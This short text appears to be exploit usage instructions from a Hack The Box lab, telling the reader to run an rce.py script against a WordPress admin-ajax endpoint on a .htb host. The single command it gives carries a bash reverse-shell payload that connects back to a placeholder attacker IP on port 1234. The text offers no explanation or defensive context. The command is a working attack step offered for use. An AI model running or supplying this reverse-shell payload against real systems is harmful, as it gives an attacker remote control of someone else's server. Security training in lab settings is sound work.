download rce and lib file to the same dir and run the command 

python3 rce.py 'http://blog.bigbang.htb/wp-admin/admin-ajax.php' 'bash -c "bash -i >& /dev/tcp/[ip here]/1234 0>&1"'
